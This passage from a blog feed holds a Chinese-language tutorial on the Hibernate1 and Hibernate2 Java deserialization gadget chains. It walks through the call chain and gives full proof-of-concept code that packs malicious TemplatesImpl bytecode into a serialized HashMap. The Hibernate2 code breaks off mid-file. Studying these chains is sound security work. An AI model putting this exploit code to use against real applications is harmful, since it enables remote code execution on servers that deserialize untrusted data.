31f491fb3ccdcaf8414bd71cdab4ee7fd6caa35a34a75b8f2ae8c546b71c2a91436653e449aec6523b3cf8436b0214ef01cfffd06a97c72a1deca7dfaf9a8c413b50f371abdd5de30e585d6bc4964724d6000dd9f4621447f016dae4c6b532d19e972d2066c6c3e1c82128a43b0f0faf50aa06554a4057963b3f51ea0df2cce04adaf23cb7d004fee66323cab34f01ef86cdec12ba0aadbc0c631187114b5d67f3f41b55cb8b18d8dcc2b5bda19ee08a8b82efd5be6c5fc76848a7a22a63bde57b9621fbc063377dd46dc734528ac68cb13ec63e13f2e91f88ff743094c4147155a8a33c9b5dc7fc7e54be664786f3fbe28b57630aff65703e7cd61c71b1d5857a6b257d5e9b6519adcbff99f42b9e17460075823fcbfce716897dae3b03921</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> show-SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>show-XXE</title>
      <link href="/posts/9d7a060.html"/>
      <url>/posts/9d7a060.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a57f27d4864f5e5500d24962cb2c714021c6ed7e1cde1069c46baeeb16e50bdd"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> show-XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java-Hibernate</title>
      <link href="/posts/3531a825.html"/>
      <url>/posts/3531a825.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://boogipop.com/2023/04/02/%E6%88%91%E6%9D%A5%E5%AF%B9Hibernate%E5%88%A9%E7%94%A8%E9%93%BE%E8%AF%B4%E4%B8%80%E4%BA%8C/">参考链接1 </a>       <a href="https://su18.org/post/ysoserial-su18-3/#hibernate1">参考链接2</a></p><h2 id="Hibernate1"><a href="#Hibernate1" class="headerlink" title="Hibernate1"></a>Hibernate1</h2><p>这也是可以通过调用任意getter函数来进行代码执行的一个类</p><p><strong>首先先给上调用栈</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">    TypedValue.hashCode()</span><br><span class="line">        ValueHolder.getValue()</span><br><span class="line">            ValueHolder.DeferredInitializer().initialize()</span><br><span class="line">                ComponentType.getHashCode()</span><br><span class="line">            PojoComponentTuplizer.getPropertyValue()</span><br><span class="line">                        AbstractComponentTuplizer.getPropertyValue()</span><br><span class="line">                            BasicPropertyAccessor$BasicGetter.get()/GetterMethodImpl.get()</span><br><span class="line">                                TemplatesImpl.getOutputProperties()</span><br></pre></td></tr></table></figure><p><strong>我们还是老样子 从能够执行命令的地方开始分析</strong></p><p><code>BasicPropertyAccessor#get</code>  方法</p><p><img src="../images/image-20230711230854168.png" alt="image-20230711230854168"></p><p>这个的话是可以调用任意方法</p><p><strong>这里可控的两点就是<code>method</code>和这个<code>target</code>参数</strong></p><p><code>BasicPropertyAccessor#BasicGetter</code>  方法</p><p><img src="../images/image-20230711231133798.png" alt="image-20230711231133798"></p><p>这个类的构造方法是可以设置这个<code>method</code>方法的</p><p><code>BasicPropertyAccessor#creatGetter</code>  方法</p><p><img src="../images/image-20230711231410524.png" alt="image-20230711231410524"></p><p>跟进这个方法</p><p><code>BasicPropertyAccessor#getGetterOrNull</code>   方法</p><p><img src="../images/image-20230711231507249.png" alt="image-20230711231507249"></p><p>接着跟进这个方法</p><p><code>BasicPropertyAccessor#getterMethod</code>  方法</p><p><img src="../images/image-20230711231538300.png" alt="image-20230711231538300"></p><ul><li>首先第一步就是先获取到这个<code>theClass</code>这个类里的所有方法</li><li>然后判断这些方法是是否存在参数  如果存在参数的话就退出</li><li>接着就判断无参数的方法是否是<code>get</code>或者<code>is</code>开头的</li><li>如果满足以上条件的话就将get或is后面的东西转化为小写并返回</li></ul><p><img src="../images/image-20230711231914096.png" alt="image-20230711231914096"></p><p>在<code>BasicPropertyAccessor#getterMethod</code>执行完后  就会将method进行返回  然后就返回<code>BasicGetter</code>的构造方法  这样的话就给<code>method</code>给配置完成了</p><p><strong>知道上述的东西参数怎么配置完之后  我们就得找找谁能调用这个<code>get</code>方法</strong></p><p>经过查找发现在抽象类<code>org.hibernate.tuple.component.AbstractComponentTuplizer</code>中定义了成员变量getters，并且通过<code>getPropertyValue()</code>方法调用get方法,而<code>getPropertyValues()</code>又调用了<code>getPropertyValue()</code></p><p>​    <img src="../images/image-20230711232825523.png" alt="image-20230711232825523"></p><p>就是这两个方法</p><p><strong>接着找谁调用了<code>getPropertyValues</code>()方法，由于这是抽象类，因此该找实现类哪里调用了</strong></p><p><strong>但是抽象类我们无法调用，只能使用它的子类，</strong><code>AbstractComponentTuplizer</code> 有两个子类，一个是 <code>PojoComponentTuplizer</code>，一个是 <code>DynamicMapComponentTuplizer</code>，这对应着 <code>Hibernate</code> 的实体对象的类型，即 <code>pojo</code> 和 <code>dynamic-map</code>。<code>pojo</code> 代表将 <code>Hibernate</code> 类型映射为 Java 实体类，而 <code>dynamic-map</code> 将映射为 Map 对象。</p><p>这里选择 <code>PojoComponentTuplizer</code> 类，他的 <code>getPropertyValues()</code> 方法会调用其父类的此方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object[] getPropertyValues(Object component) <span class="keyword">throws</span> HibernateException &#123;</span><br><span class="line">        <span class="keyword">if</span> (component == BackrefPropertyAccessor.UNKNOWN) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="built_in">this</span>.propertySpan];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.optimizer != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.optimizer.getAccessOptimizer() != <span class="literal">null</span> ? <span class="built_in">this</span>.optimizer.getAccessOptimizer().getPropertyValues(component) : <span class="built_in">super</span>.getPropertyValues(component);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230712114037350.png" alt="image-20230712114037350"></p><p><strong>这里就是会调用到父类里的<code>getPropertyValues</code>方法</strong></p><p>而这个方法在<code>ComponentType</code>中又被调用</p><p><img src="../images/image-20230713002720265.png" alt="image-20230713002720265"></p><p>这里让<code>componentTuplizer</code>为<code>PojoComponentTuplizer</code>即可接上链子，而在该类的<code>getHashcode</code>方法中又调用了<code>getPropertyValue</code></p><p><img src="../images/image-20230713004928706.png" alt="image-20230713004928706"></p><p>此现在该着哪里可以接上<code>getHashcode</code>，这里就再正向分析一波，首先找到在<code>TypedValue</code>类中的<code>initTransients</code>是调用<code>getHashcode</code>了的</p><p><img src="../images/image-20230713005144028.png" alt="image-20230713005144028"></p><p>那么就接着找谁调用了这个<code>initTransients</code>   这个方法</p><p><img src="../images/image-20230713005401438.png" alt="image-20230713005401438"></p><p>最后在这个<code>ValueHolder#getValue()</code>里带调用了这个<code>initialize</code>方法</p><p><strong>那么这个<code>getValue</code>方法是在这个<code>TypedValue#hashCode()</code>方法来调用</strong></p><p><img src="../images/image-20230713005511693.png" alt="image-20230713005511693"></p><p>（这个<code>this.hashcode</code>是在调用这个<code>initialize</code>的时候来给赋值的)</p><p><img src="../images/image-20230713005654920.png" alt="image-20230713005654920"></p><p><strong>那么我们现在就走到了<code>TypedValue#hashcode</code>这个方法这里了</strong></p><p><strong>那么有经验的师傅就能想到使用<code>hashMap</code>来当入口来触发了</strong></p><p><strong>(就是最外层就是<code>hashMap</code>)</strong></p><p><strong>POC如下</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.engine.spi.TypedValue;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.type.Type;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hibernate1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;Hibernate1.bin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; componentTypeClass             = Class.forName(<span class="string">&quot;org.hibernate.type.ComponentType&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; pojoComponentTuplizerClass     = Class.forName(<span class="string">&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; abstractComponentTuplizerClass = Class.forName(<span class="string">&quot;org.hibernate.tuple.component.AbstractComponentTuplizer&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成包含恶意类字节码的 TemplatesImpl 类</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tmpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(tmpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(evil.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(tmpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(tmpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">Method</span>  <span class="variable">method</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredMethod(<span class="string">&quot;getOutputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Object getter;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法</span></span><br><span class="line">            Class&lt;?&gt;       getterImpl  = Class.forName(<span class="string">&quot;org.hibernate.property.access.spi.GetterMethodImpl&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; constructor = getterImpl.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            getter = constructor.newInstance(<span class="literal">null</span>, <span class="literal">null</span>, method);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">            <span class="comment">// 创建 BasicGetter 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法</span></span><br><span class="line">            Class&lt;?&gt;       basicGetter = Class.forName(<span class="string">&quot;org.hibernate.property.BasicPropertyAccessor$BasicGetter&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; constructor = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            getter = constructor.newInstance(tmpl.getClass(), method, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 PojoComponentTuplizer 实例，用来触发 Getter 方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tuplizer</span> <span class="operator">=</span> createWithoutConstructor(pojoComponentTuplizerClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> abstractComponentTuplizerClass.getDeclaredField(<span class="string">&quot;getters&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">getters</span> <span class="operator">=</span> Array.newInstance(getter.getClass(), <span class="number">1</span>);</span><br><span class="line">        Array.set(getters, <span class="number">0</span>, getter);</span><br><span class="line">        field.set(tuplizer, getters);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 ComponentType 实例，用来触发 PojoComponentTuplizer 的 getPropertyValues 方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">type</span> <span class="operator">=</span> createWithoutConstructor(componentTypeClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射将相关值写入，满足 ComponentType 的 getHashCode 调用所需条件</span></span><br><span class="line">        setFieldValue(type,<span class="string">&quot;componentTuplizer&quot;</span>,tuplizer);</span><br><span class="line">        setFieldValue(type,<span class="string">&quot;propertySpan&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        setFieldValue(type,<span class="string">&quot;propertyTypes&quot;</span>,<span class="keyword">new</span> <span class="title class_">Type</span>[]&#123;(Type) type&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法</span></span><br><span class="line">        <span class="type">TypedValue</span> <span class="variable">typedValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypedValue</span>((Type) type, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建反序列化用 HashMap</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(typedValue, <span class="string">&quot;su18&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// put 到 hashmap 之后再反射写入，防止 put 时触发</span></span><br><span class="line">        setFieldValue(typedValue,<span class="string">&quot;value&quot;</span>,tmpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230713233831925.png" alt="image-20230713233831925"></p><p><strong>完整的利用链</strong></p><p><img src="../images/image-20230713233920372.png" alt="image-20230713233920372"></p><p><strong>这里这样写是因为版本的不同  调用链在这一块也是会不同的</strong></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li><strong>利用说明：</strong><ul><li><strong>由 HashMap 的反序列化触发 TypedValue 的 <code>hashCode</code>，调用到 ComponentType 的 <code>getHashCode</code> 方法，调用 PojoComponentTuplizer 的 <code>getPropertyValue</code> 的方法，然后使用 <code>BasicPropertyAccessor$BasicGetter</code> 调用 <code>get</code> 方法，触发 TemplatesImpl 的 <code>getOutputProperties</code> 方法。</strong></li></ul></li></ol><ol><li>依赖版本</li></ol><p><strong>Hibernate : 3-5</strong></p><ol><li><strong>本次复现用的依赖版本</strong></li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.hibernate/hibernate-core --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.hibernate<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hibernate-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.3.11.Final<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230713234611171.png" alt="image-20230713234611171"></p><p><strong>这位师傅提出了一个想法  可以学习一下为什么</strong>   </p><h2 id="Hibernate2"><a href="#Hibernate2" class="headerlink" title="Hibernate2"></a>Hibernate2</h2><p>既然是触发 <code>getter</code> 方法，这就让我们想到了 <code>fastjson</code> 的经典触发方式，除了 <code>TemplatesImpl</code> 实例化恶意类字节码，还有 <code>JdbcRowSetImpl</code> 触发恶意 <code>JNDI</code> 查询，<code>Hibernate2</code> 就是这种方式，不知道这两个漏洞是谁先出的，谁借鉴的谁。</p><p>在 <code>fastjson</code> 中使用 <code>JdbcRowSetImpl</code> 的 <code>setAutoCommit</code>（setter）方法触发 <code>JNDI</code> 查询，而在 <code>Hibernate2</code> 中由于是触发 getter 方法，因此我们选择 <code>getDatabaseMetaData</code>。</p><p><strong>POC</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.engine.spi.TypedValue;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.type.Type;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hibernate2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;Hibernate1.bin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">    